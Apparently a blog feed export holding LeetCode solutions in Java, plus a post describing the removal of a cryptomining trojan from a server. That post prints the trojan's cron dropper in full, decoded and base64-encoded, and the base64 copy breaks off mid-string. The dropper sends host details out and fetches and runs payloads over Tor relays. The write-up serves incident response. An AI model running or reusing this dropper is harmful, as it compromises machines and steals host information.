    <title><![CDATA[力扣每日一题 2021/4/7]]></title>
    <url>%2Fposts%2F72c6e4e2%2F</url>
    <content type="text"><![CDATA[题目：81. 搜索旋转排序数组 II难度：中等 已知存在一个按非降序排列的整数数组 nums ，数组中的值不必互不相同。 在传递给函数之前，nums 在预先未知的某个下标 k（0 &lt;= k &lt; nums.length）上进行了 旋转 ** ，使数组变为 [nums[k], nums[k+1], …, nums[n-1], nums[0], nums[1], …, nums[k-1]]（下标 **从 0 开始 计数）。例如， [0,1,2,4,4,4,5,6,6,7] 在下标 5 处经旋转后可能变为 [4,5,6,6,7,0,1,2,4,4] 。 给你 旋转后 的数组 nums 和一个整数 target ，请你编写一个函数来判断给定的目标值是否存在于数组中。如果 nums 中存在这个目标值 target ，则返回 true ，否则返回 false 。 示例 1： 12输入：nums = [2,5,6,0,0,1,2], target = 0输出：true 示例 2： 12输入：nums = [2,5,6,0,0,1,2], target = 3输出：false 提示： 1 &lt;= nums.length &lt;= 5000 -104 &lt;= nums[i] &lt;= 104 题目数据保证 nums 在预先未知的某个下标上进行了旋转 -104 &lt;= target &lt;= 104 进阶： 这是 搜索旋转排序数组 的延伸题目，本题中的 nums 可能包含重复元素。 这会影响到程序的时间复杂度吗？会有怎样的影响，为什么？ 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/search-in-rotated-sorted-array-ii/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 二分查找 解题代码遍历查找 1234567891011class Solution &#123; public boolean search(int[] nums, int target) &#123; boolean ans = false; for (int i : nums) &#123; if (i == target) &#123; return true; &#125; &#125; return ans; &#125;&#125; 二分查找 123456789101112131415161718192021222324252627class Solution &#123; public boolean search(int[] nums, int target) &#123; return binarySearch(nums,target,0,nums.length - 1); &#125; private boolean binarySearch(int[] nums,int t,int l,int r) &#123; if (l &gt;= r) &#123; return nums[l] == t; &#125; int m = (l + r) / 2; if (nums[m] == t) &#123; return true; &#125; else if (nums[m] &gt; t) &#123; if (nums[l] &gt;= nums[r]) &#123; return binarySearch(nums,t,l,m) || binarySearch(nums,t,m + 1,r); &#125; else &#123; return binarySearch(nums,t,l,m); &#125; &#125; else &#123; if (nums[l] &gt;= nums[r]) &#123; return binarySearch(nums,t,l,m) || binarySearch(nums,t,m + 1,r); &#125; else &#123; return binarySearch(nums,t,m + 1,r); &#125; &#125; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数组</tag>
        <tag>二分查找</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/4/6]]></title>
    <url>%2Fposts%2F5c1d474%2F</url>
    <content type="text"><![CDATA[题目：80. 删除有序数组中的重复项 II难度：中等 给你一个有序数组 nums ，请你 原地 删除重复出现的元素，使每个元素 最多出现两次 ，返回删除后数组的新长度。 不要使用额外的数组空间，你必须在 原地 修改输入数组 并在使用 O(1) 额外空间的条件下完成。 说明： 为什么返回数值是整数，但输出的答案是数组呢？ 请注意，输入数组是以 「引用」 方式传递的，这意味着在函数里修改输入数组对于调用者是可见的。 你可以想象内部操作如下: 12345678// nums 是以“引用”方式传递的。也就是说，不对实参做任何拷贝int len = removeDuplicates(nums);// 在函数里修改输入数组对于调用者是可见的。// 根据你的函数返回的长度, 它会打印出数组中 该长度范围内 的所有元素。for (int i = 0; i &lt; len; i++) &#123; print(nums[i]);&#125; 示例 1： 123输入：nums = [1,1,1,2,2,3]输出：5, nums = [1,1,2,2,3]解释：函数应返回新长度 length = 5, 并且原数组的前五个元素被修改为 1, 1, 2, 2, 3 。 不需要考虑数组中超出新长度后面的元素。 示例 2： 123输入：nums = [0,0,1,1,1,1,2,3,3]输出：7, nums = [0,0,1,1,2,3,3]解释：函数应返回新长度 length = 7, 并且原数组的前五个元素被修改为 0, 0, 1, 1, 2, 3, 3 。 不需要考虑数组中超出新长度后面的元素。 提示： 1 &lt;= nums.length &lt;= 3 * 104 -104 &lt;= nums[i] &lt;= 104 nums 已按升序排列 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/remove-duplicates-from-sorted-array-ii/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 双指针扫描一遍数组，去判断每个元素是否应该保留即可 解题代码1234567891011121314151617181920class Solution &#123; public int removeDuplicates(int[] nums) &#123; int len = 0; int l = 0; int r = 0; int p = 0; while (l &lt; nums.length) &#123; while (r &lt; nums.length &amp;&amp; nums[l] == nums[r]) &#123; r++; &#125; int cnt = r - l; for (int i = 0;i &lt; cnt &amp;&amp; i &lt; 2;i++) &#123; nums[p++] = nums[l++]; len++; &#125; l = r; &#125; return len; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>双指针</tag>
        <tag>数组</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/4/5]]></title>
    <url>%2Fposts%2F9cc885ce%2F</url>
    <content type="text"><![CDATA[题目：88. 合并两个有序数组难度：简单 给你两个有序整数数组 nums1 和 nums2，请你将 nums2 合并到 nums1 中，使 nums1 成为一个有序数组。 初始化 nums1 和 nums2 的元素数量分别为 m 和 n 。你可以假设 nums1 的空间大小等于 m + n，这样它就有足够的空间保存来自 nums2 的元素。 示例 1： 12输入：nums1 = [1,2,3,0,0,0], m = 3, nums2 = [2,5,6], n = 3输出：[1,2,2,3,5,6] 示例 2： 12输入：nums1 = [1], m = 1, nums2 = [], n = 0输出：[1] 提示： nums1.length == m + n nums2.length == n 0 &lt;= m, n &lt;= 200 1 &lt;= m + n &lt;= 200 -109 &lt;= nums1[i], nums2[i] &lt;= 109 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/merge-sorted-array/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 双指针 解题代码1234567891011121314151617class Solution &#123; public void merge(int[] nums1, int m, int[] nums2, int n) &#123; int p1 = m - 1; int p2 = n - 1; int p = m + n - 1; while (p &gt;= 0) &#123; if (p1 &gt;= 0 &amp;&amp; p2 &gt;= 0 &amp;&amp; nums1[p1] &gt; nums2[p2]) &#123; nums1[p] = nums1[p1]; p1--; &#125; else if (p2 &gt;= 0) &#123; nums1[p] = nums2[p2]; p2--; &#125; p--; &#125; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数组</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/4/4]]></title>
    <url>%2Fposts%2Febcfb558%2F</url>
    <content type="text"><![CDATA[题目：781. 森林中的兔子难度：中等 森林中，每个兔子都有颜色。其中一些兔子（可能是全部）告诉你还有多少其他的兔子和自己有相同的颜色。我们将这些回答放在 answers 数组里。 返回森林中兔子的最少数量。 123456789101112131415示例:输入: answers = [1, 1, 2]输出: 5解释:两只回答了 &quot;1&quot; 的兔子可能有相同的颜色，设为红色。之后回答了 &quot;2&quot; 的兔子不会是红色，否则他们的回答会相互矛盾。设回答了 &quot;2&quot; 的兔子为蓝色。此外，森林中还应有另外 2 只蓝色兔子的回答没有包含在数组中。因此森林中兔子的最少数量是 5: 3 只回答的和 2 只没有回答的。输入: answers = [10, 10, 10]输出: 11输入: answers = []输出: 0 说明: answers 的长度最大为1000。 answers[i] 是在 [0, 999] 范围内的整数。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/rabbits-in-forest/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 很显然，每种颜色兔子的数量应该是 ans[i] + 1，但这里有一种特殊情况，就是，ans[i] 出现的次数可能比 ans{i] 这个值更大，处理好这种特殊情况就可以了 解题代码123456789101112131415161718class Solution &#123; public int numRabbits(int[] answers) &#123; int ans = 0; Map&lt;Integer,Integer&gt; map = new HashMap&lt;&gt;(); for (int k : answers) &#123; int v = map.getOrDefault(k,0); if (v &gt; 0) &#123; map.put(k,v - 1); &#125; else &#123; map.put(k,k); ans += k + 1; &#125; &#125; return ans; &#125;&#125; 当然，由于题目告诉了我们ans[i]的取值，所以我们可以直接使用数组 1234567891011121314151617class Solution &#123; public int numRabbits(int[] answers) &#123; int ans = 0; int[] map = new int[1000]; for (int k : answers) &#123; if (map[k] &gt; 0) &#123; map[k]--; &#125; else &#123; map[k] = k; ans += k + 1; &#125; &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数组</tag>
        <tag>哈希表</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/4/2]]></title>
    <url>%2Fposts%2F2ac106d%2F</url>
    <content type="text"><![CDATA[题目：面试题 17.21. 直方图的水量难度：困难 给定一个直方图(也称柱状图)，假设有人从上面源源不断地倒水，最后直方图能存多少水量?直方图的宽度为 1。 上面是由数组 [0,1,0,2,1,0,1,3,2,1,2,1] 表示的直方图，在这种情况下，可以接 6 个单位的水（蓝色部分表示水）。 感谢 Marcos 贡献此图。 示例: 12输入: [0,1,0,2,1,0,1,3,2,1,2,1]输出: 6 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/volume-of-histogram-lcci/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 提示已经把思路都告诉我们了 解题代码暴力 1234567891011121314151617class Solution &#123; public int trap(int[] height) &#123; int ans = 0; for (int i = 1;i &lt; height.length - 1;i++) &#123; int rMax = height[i]; for (int j = i + 1;j &lt; height.length;j++) &#123; rMax = Math.max(rMax,height[j]); &#125; int lMax = height[i]; for (int j = i;j &gt;= 0;j--) &#123; lMax = Math.max(lMax,height[j]); &#125; ans += Math.min(lMax,rMax) - height[i]; &#125; return ans; &#125;&#125; 动态规划预处理 12345678910111213141516171819202122232425262728class Solution &#123; public int trap(int[] height) &#123; int len = height.length; int ans = 0; if (len &lt;= 2) &#123; return ans; &#125; int[] lMax = new int[len]; lMax[0] = height[0]; for (int i = 1;i &lt; len;i++) &#123; lMax[i] = Math.max(lMax[i - 1],height[i]); &#125; int[] rMax = new int[len]; rMax[len - 1] = height[len - 1]; for (int i = len - 2;i &gt;= 0;i--) &#123; rMax[i] = Math.max(rMax[i + 1],height[i]); &#125; for (int i = 1;i &lt; height.length - 1;i++) &#123; int r = rMax[i]; int l = lMax[i]; ans += Math.min(l,r) - height[i]; &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数组</tag>
        <tag>动态规划</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/4/1]]></title>
    <url>%2Fposts%2F9ba541d7%2F</url>
    <content type="text"><![CDATA[题目：1006. 笨阶乘难度：中等 通常，正整数 n 的阶乘是所有小于或等于 n 的正整数的乘积。例如，factorial(10) = 10 * 9 * 8 * 7 * 6 * 5 * 4 * 3 * 2 * 1。 相反，我们设计了一个笨阶乘 clumsy：在整数的递减序列中，我们以一个固定顺序的操作符序列来依次替换原有的乘法操作符：乘法(*)，除法(/)，加法(+)和减法(-)。 例如，clumsy(10) = 10 * 9 / 8 + 7 - 6 * 5 / 4 + 3 - 2 * 1。然而，这些运算仍然使用通常的算术运算顺序：我们在任何加、减步骤之前执行所有的乘法和除法步骤，并且按从左到右处理乘法和除法步骤。 另外，我们使用的除法是地板除法（floor division），所以 10 * 9 / 8 等于 11。这保证结果是一个整数。 实现上面定义的笨函数：给定一个整数 N，它返回 N 的笨阶乘。 示例 1： 123输入：4输出：7解释：7 = 4 * 3 / 2 + 1 示例 2： 123输入：10输出：12解释：12 = 10 * 9 / 8 + 7 - 6 * 5 / 4 + 3 - 2 * 1 提示： 1 &lt;= N &lt;= 10000 -2^31 &lt;= answer &lt;= 2^31 - 1 （答案保证符合 32 位整数。） 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/clumsy-factorial/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路12345678910111213141516171819202122i = 11i = 22 * 1i = 33*2/1i= 44*3/2 +1i = 55*4/3+2-1i = 66*5/4+3-2*1i = 77*6/5+4-3*2/1i = 88*7/6+5-4*3/2+1 解题代码借助辅助栈 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283class Solution &#123; public int clumsy(int N) &#123; // print(N); switch (N) &#123; case 1: return 1; case 2: return 2; case 3: return 6; &#125; Stack&lt;Integer&gt; s = new Stack&lt;&gt;(); int i = N; while (i &gt;= 1) &#123; if (i == N) &#123; s.push(i * (i - 1) / (i - 2)); i -= 3; &#125; s.push(i); i--; boolean flag = false; switch (i) &#123; case 0: flag = true; break; case 1: flag = true; s.push(-1); break; case 2: flag = true; s.push(-2); break; case 3: flag = true; s.push(-6); break; default: s.push(-(i * (i - 1) / (i - 2))); i -= 3; &#125; if (flag) &#123; break; &#125; &#125; // System.out.println(s); int ans = 0; while (!s.isEmpty()) &#123; ans += s.pop(); &#125; return ans; &#125; private void print(int N) &#123; StringBuilder builder = new StringBuilder(); int p = 0; for (int i = N;i &gt;= 1;i--) &#123; switch (p % 4) &#123; case 0: builder.append(i + "*"); break; case 1: builder.append(i + "/"); break; case 2: builder.append(i + "+"); break; case 3: builder.append(i + "-"); break; &#125; p++; &#125; builder.setLength(builder.length() - 1); System.out.println(builder); &#125;&#125; 不借助辅助栈 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152class Solution &#123; public int clumsy(int N) &#123; switch (N) &#123; case 1: return 1; case 2: return 2; case 3: return 6; &#125; int ans = 0; int i = N; while (i &gt;= 1) &#123; if (i == N) &#123; ans += (i * (i - 1) / (i - 2)); i -= 3; &#125; ans += (i); i--; boolean flag = false; switch (i) &#123; case 0: flag = true; break; case 1: flag = true; ans += (-1); break; case 2: flag = true; ans += (-2); break; case 3: flag = true; ans += (-6); break; default: ans += (-(i * (i - 1) / (i - 2))); i -= 3; &#125; if (flag) &#123; break; &#125; &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/3/31]]></title>
    <url>%2Fposts%2F341157ba%2F</url>
    <content type="text"><![CDATA[题目：90. 子集 II难度：中等 给你一个整数数组 nums ，其中可能包含重复元素，请你返回该数组所有可能的子集（幂集）。 解集 不能 包含重复的子集。返回的解集中，子集可以按 任意顺序 排列。 示例 1： 12输入：nums = [1,2,2]输出：[[],[1],[1,2],[1,2,2],[2],[2,2]] 示例 2： 12输入：nums = [0]输出：[[],[0]] 提示： 1 &lt;= nums.length &lt;= 10 -10 &lt;= nums[i] &lt;= 10 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/subsets-ii/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 通常，我们考虑幂集问题，都会用回溯法，针对当前节点选与不选两个状态，使用两个分支去搜索，但是实际上，我们只需要考虑选当前节点这一种状态即可，为什么呢，因为在算法回溯之后，局面自然会变成不选当前节点的情况，基于此，我们可以减少搜索的分支，优化效率 解题代码123456789101112131415161718192021class Solution &#123; public List&lt;List&lt;Integer&gt;&gt; subsetsWithDup(int[] nums) &#123; Arrays.sort(nums); dfs(nums,0,new ArrayList&lt;&gt;()); return ans; &#125; List&lt;List&lt;Integer&gt;&gt; ans = new ArrayList&lt;&gt;(); private void dfs(int[] nums,int c,List&lt;Integer&gt; tmp) &#123; ans.add(new ArrayList&lt;&gt;(tmp)); for (int i = c;i &lt; nums.length;i++) &#123; if (i &gt; c &amp;&amp; nums[i] == nums[i - 1]) &#123; continue; &#125; tmp.add(nums[i]); dfs(nums,i + 1,tmp); tmp.remove(tmp.size() - 1); &#125; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数组</tag>
        <tag>回溯算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/3/30]]></title>
    <url>%2Fposts%2F4316672c%2F</url>
    <content type="text"><![CDATA[题目：74. 搜索二维矩阵难度：中等 编写一个高效的算法来判断 m x n 矩阵中，是否存在一个目标值。该矩阵具有如下特性： 每行中的整数从左到右按升序排列。 每行的第一个整数大于前一行的最后一个整数。 示例 1： 12输入：matrix = [[1,3,5,7],[10,11,16,20],[23,30,34,60]], target = 3输出：true 示例 2： 12输入：matrix = [[1,3,5,7],[10,11,16,20],[23,30,34,60]], target = 13输出：false 提示： m == matrix.length n == matrix[i].length 1 &lt;= m, n &lt;= 100 -104 &lt;= matrix[i][j], target &lt;= 104 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/search-a-2d-matrix/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 我们知道，多维数组在内存中，本质上还是一维数组，即是连续的，而题目告诉我们，每行中的整数从左到右按升序排列。每行的第一个整数大于前一行的最后一个整数。这相当与是给了我们一个升序的一维数组，因此，可以很自然的想到二分查找，我们只需要将二维数组当做一维数组处理即可，这里给出二分查找的递归和迭代两种写法 解题代码递归写法 123456789101112131415161718192021222324252627class Solution &#123; public boolean searchMatrix(int[][] matrix, int target) &#123; int m = matrix.length; int n = matrix[0].length; return binarySearch(matrix,target,0,m * n - 1); &#125; private boolean binarySearch(int[][] matrix,int t,int l,int r) &#123; if (l &gt; r) &#123; return false; &#125; int row = matrix.length; int col = matrix[0].length; int m = (l + r) / 2; int x = m / col; int y = m % col; if (t == matrix[x][y]) &#123; return true; &#125; else if (t &lt; matrix[x][y]) &#123; return binarySearch(matrix,t,l,m - 1); &#125; else &#123; return binarySearch(matrix,t,m + 1,r); &#125; &#125;&#125; 迭代写法 1234567891011121314151617181920212223class Solution &#123; public boolean searchMatrix(int[][] matrix, int target) &#123; int m = matrix.length; int n = matrix[0].length; int l = 0; int r = m * n - 1; while (l &lt;= r) &#123; int mid = (l + r) / 2; int x = mid / n; int y = mid % n; if (target == matrix[x][y]) &#123; return true; &#125; else if (target &lt; matrix[x][y]) &#123; r = mid - 1; &#125; else &#123; l = mid + 1; &#125; &#125; return false; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数组</tag>
        <tag>分治算法</tag>
        <tag>二分查找</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/3/29]]></title>
    <url>%2Fposts%2F23d1eec9%2F</url>
    <content type="text"><![CDATA[题目：190. 颠倒二进制位难度：简单 颠倒给定的 32 位无符号整数的二进制位。 提示： 请注意，在某些语言（如 Java）中，没有无符号整数类型。在这种情况下，输入和输出都将被指定为有符号整数类型，并且不应影响您的实现，因为无论整数是有符号的还是无符号的，其内部的二进制表示形式都是相同的。 在 Java 中，编译器使用二进制补码记法来表示有符号整数。因此，在上面的 示例 2 中，输入表示有符号整数 -3，输出表示有符号整数 -1073741825。 进阶 :如果多次调用这个函数，你将如何优化你的算法？ 示例 1： 1234输入: 00000010100101000001111010011100输出: 00111001011110000010100101000000解释: 输入的二进制串 00000010100101000001111010011100 表示无符号整数 43261596， 因此返回 964176192，其二进制表示形式为 00111001011110000010100101000000。 示例 2： 1234输入：11111111111111111111111111111101输出：10111111111111111111111111111111解释：输入的二进制串 11111111111111111111111111111101 表示无符号整数 4294967293， 因此返回 3221225471 其二进制表示形式为 10111111111111111111111111111111 。 示例 1： 1234输入：n = 00000010100101000001111010011100输出：964176192 (00111001011110000010100101000000)解释：输入的二进制串 00000010100101000001111010011100 表示无符号整数 43261596， 因此返回 964176192，其二进制表示形式为 00111001011110000010100101000000。 示例 2： 1234输入：n = 11111111111111111111111111111101输出：3221225471 (10111111111111111111111111111111)解释：输入的二进制串 11111111111111111111111111111101 表示无符号整数 4294967293， 因此返回 3221225471 其二进制表示形式为 10111111111111111111111111111111 。 提示： 输入是一个长度为 32 的二进制字符串 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/reverse-bits/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 虽然有点作弊的嫌疑，但是来得够简洁，并且超越了100% 解题代码123456public class Solution &#123; // you need treat n as an unsigned value public int reverseBits(int n) &#123; return Integer.reverse(n); &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>位运算</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[记一次帮师兄解决服务器挖矿木马的过程]]></title>
    <url>%2Fposts%2Fe2d5f670%2F</url>
    <content type="text"><![CDATA[背景最近师兄找到我，说他的服务器似乎被挂了挖矿木马，cpu占用率居高不下，网站（个人博客）也看起来像是被挂马了，这篇博客打算详细记录一下这次和挖矿木马斗争的过程 现象 首先是某云服务器控制台给出了性能受限警告 分析：师兄的服务器看起来貌似就只挂了个网站，一个mysql数据库，不至于遇到性能受限的情况，因此CPU持续的被占用这么高的情况，十有八九中了挖矿木马 然后是网站（个人博客）无法访问 分析：这张图片看起来像阿里cdn禁止访问的图片，因此分析应该是套了一层cdn，禁止直接使用ip访问，后期经过验证，果然如此，使用域名是可以访问的，但是出现了css样式加载不出来的问题，我猜大概率是因为https证书过期了，一些内容无法经过cdn加载出来，希望师兄尽快去处理一下 进一步分析经过上面的分析，网站挂马应该是不存在的，不过也不排除是网站漏洞导致反弹了shell，从而被挂上木马的（建议师兄仔细看一下后台有没有鉴权或者未授权访问漏洞以及远程代码执行漏洞，尤其是文件上传的接口部分，更要仔细排查），为什么我会得出这样的结论呢？因为我把他的网站源码down了下来，使用某web扫描引擎，扫描了一遍，结论是没有发现明显的木马，我自己也大概的扫了一下，确实是没有明显的跳转到其他链接和其他比较明显的木马文件之类的。所以，接下来就只剩这个疑似中了挖矿木马的情况了 破局定位木马首先使用top命令，查看一下当前的CPU占用情况 可以看到aLZmFuXY这个进程一直在占用着CPU的资源，很明显就是罪魁祸首 于是尝试，全局搜索一下看看，执行 1find / -iname aLZmFuXY 好吧，看来不是这么明显的，什么都没有搜到 然后，尝试直接kill掉这个进程试试，先执行 1ps -ef | grep aLZmFuXY 定位到进程，然后执行 1kill -9 6283 尝试杀掉进程，没想到，直接断开了ssh连接，看来这个木马还有点顽固，猜想肯定有某种重启或者定时执行的机制 于是，重新蓝（连）上ssh，再次查看CPU使用情况 果不其然，它（aLZmFuXY）又回来（自动启动）了 现在我们尝试去搞懂木马的启动机制，经过上面的分析和实验，我们可以知道，这个挖矿的木马程序应该是有自启动和重启机制的，于是，我们可以从这里入手，使用 1crontab -l 查看所有的定时任务，发现只有一个/root/.systemd-service.sh，那铁定就是它在捣鬼，等等，好像有什么细节被我们忽略了？？？想不起来，先放一下（其实是在top命令的执行结果那里，捣蛋鬼systemd总是和我们的木马进程aLZmFuXY一起出现的） 现在我们来看一下，这个捣蛋鬼脚本到底写了什么，执行 1cat /root/.systemd-service.sh 发现是一堆base64编码之后的脚本，我们尝试解码看看 12345678910111213141516171819202122232425262728293031323334353637nP8byPUGOwKjVfPZZsp5octdXHTWGyPqgVeY82zV1de6AY0ydAtgEGmo+JaumEfVexec &amp;&gt;/dev/nullexport PATH=$PATH:$HOME:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbind=$(grep x:$(id -u): /etc/passwd|cut -d: -f6)c=$(echo &quot;curl -4fsSLkA- -m200&quot;)t=$(echo &quot;wvzyv2nptjuxcqoibeklxese46j4uonzaapwyl6wvhdknjlqlcoeu7id&quot;)sockz() &#123;n=(doh.defaultroutes.de dns.hostux.net uncensored.lux1.dns.nixnet.xyz dns.rubyfish.cn dns.twnic.tw doh.centraleu.pi-dns.com doh.dns.sb doh-fi.blahdns.com fi.doh.dns.snopyta.org dns.flatuslifir.is doh.li dns.digitale-gesellschaft.ch)p=$(echo &quot;dns-query?name=relay.tor2socks.in&quot;)s=$($c https://$&#123;n[$((RANDOM%10))]&#125;/$p | grep -oE &quot;\b([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;\b&quot; |tr &apos; &apos; &apos;\n&apos;|grep -Ev [.]0|sort -uR|head -n 1)&#125;fexe() &#123;for i in . $HOME /usr/bin $d /var/tmp ;do echo exit &gt; $i/i &amp;&amp; chmod +x $i/i &amp;&amp; cd $i &amp;&amp; ./i &amp;&amp; rm -f i &amp;&amp; break;done&#125;u() &#123;sockzf=/int.$(uname -m)x=./$(date|md5sum|cut -f1 -d-)r=$(curl -4fsSLk checkip.amazonaws.com||curl -4fsSLk ip.sb)_$(whoami)_$(uname -m)_$(uname -n)_$(ip a|grep &apos;inet &apos;|awk &#123;&apos;print $2&apos;&#125;|md5sum|awk &#123;&apos;print $1&apos;&#125;)_$(crontab -l|base64 -w0)$c -x socks5h://$s:9050 $t.onion$f -o$x -e$r || $c $1$f -o$x -e$rchmod +x $x;$x;rm -f $x&#125;for h in tor2web.in tor2web.it onion.foundation onion.com.de onion.sh tor2web.su doif ! ls /proc/$(head -n 1 /tmp/.X11-unix/01)/status; thenfexe;u $t.$hls /proc/$(head -n 1 /tmp/.X11-unix/01)/status || (cd /tmp;u $t.$h)ls /proc/$(head -n 1 /tmp/.X11-unix/01)/status || (cd /dev/shm;u $t.$h)elsebreakfidone 好了，有了源代码的佐证，现在我们终于可以确定，这个捣蛋鬼就是一个活生生的挖矿木马，别问我怎么确定的（tor2web都出来了，这还不够明显吗？？？） 附上源文件： 1234#!/bin/bashexec &amp;&gt;/dev/nullecho nP8byPUGOwKjVfPZZsp5octdXHTWGyPqgVeY82zV1de6AY0ydAtgEGmo+JaumEfVecho blA4YnlQVUdPd0tqVmZQWlpzcDVvY3RkWEhUV0d5UHFnVmVZODJ6VjFkZTZBWTB5ZEF0Z0VHbW8rSmF1bUVmVgpleGVjICY+L2Rldi9udWxsCmV4cG9ydCBQQVRIPSRQQVRIOiRIT01FOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbgoKZD0kKGdyZXAgeDokKGlkIC11KTogL2V0Yy9wYXNzd2R8Y3V0IC1kOiAtZjYpCmM9JChlY2hvICJjdXJsIC00ZnNTTGtBLSAtbTIwMCIpCnQ9JChlY2hvICJ3dnp5djJucHRqdXhjcW9pYmVrbHhlc2U0Nmo0dW9uemFhcHd5bDZ3dmhka25qbHFsY29ldTdpZCIpCgpzb2NreigpIHsKbj0oZG9oLmRlZmF1bHRyb3V0ZXMuZGUgZG5zLmhvc3R1eC5uZXQgdW5jZW5zb3JlZC5sdXgxLmRucy5uaXhuZXQueHl6IGRucy5ydWJ5ZmlzaC5jbiBkbnMudHduaWMudHcgZG9oLmNlbnRyYWxldS5waS1kbnMuY29tIGRvaC5kbnMuc2IgZG9oLWZpLmJsYWhkbnMuY29tIGZpLmRvaC5kbnMuc25vcHl0YS5vcmcgZG5zLmZsYXR1c2xpZmlyLmlzIGRvaC5saSBkbnMuZGlnaXRhbGUtZ2VzZWxsc2NoYWZ0LmNoKQpwPSQoZWNobyAiZG5zLXF1ZXJ5P25hbWU9cmVsYXkudG9yMnNvY2tzLmluIikKcz0kKCRjIGh0dHBzOi8vJHtuWyQoKFJBTkRPTSUxMCkpXX0vJHAgfCBncmVwIC1vRSAiXGIoWzAtOV17MSwzfVwuKXszfVswLTldezEsM31cYiIgfHRyICcgJyAnXG4nfGdyZXAgLUV2IFsuXTB8c29ydCAtdVJ8aGVhZCAtbiAxKQp9CgpmZXhlKCkgewpmb3IgaSBpbiAuICRIT01FIC91c3IvYmluICRkIC92YXIvdG1wIDtkbyBlY2hvIGV4aXQgPiAkaS9pICYmIGNobW9kICt4ICRpL2kgJiYgY2QgJGkgJiYgLi9pICYmIHJtIC1mIGkgJiYgYnJlYWs7ZG9uZQp9Cgp1KCkgewpzb2NregpmPS9pbnQuJCh1bmFtZSAtbSkKeD0uLyQoZGF0ZXxtZDVzdW18Y3V0IC1mMSAtZC0pCnI9JChjdXJsIC00ZnNTTGsgY2hlY2tpcC5hbWF6b25hd3MuY29tfHxjdXJsIC00ZnNTTGsgaXAuc2IpXyQod2hvYW1pKV8kKHVuYW1lIC1tKV8kKHVuYW1lIC1uKV8kKGlwIGF8Z3JlcCAnaW5ldCAnfGF3ayB7J3ByaW50ICQyJ318bWQ1c3VtfGF3ayB7J3ByaW50ICQxJ30pXyQoY3JvbnRhYiAtbHxiYXNlNjQgLXcwKQokYyAteCBzb2NrczVoOi8vJHM6OTA1MCAkdC5vbmlvbiRmIC1vJHggLWUkciB8fCAkYyAkMSRmIC1vJHggLWUkcgpjaG1vZCAreCAkeDskeDtybSAtZiAkeAp9Cgpmb3IgaCBpbiB0b3Iyd2ViLmluIHRvcjJ3ZWIuaXQgb25pb24uZm91bmRhdGlvbiBvbmlvbi5jb20uZGUgb25pb24uc2ggdG9yMndlYi5zdSAKZG8KaWYgISBscyAvcHJvYy8kKGhlYWQgLW4gMSAvdG1wLy5YMTEtdW5peC8wMSk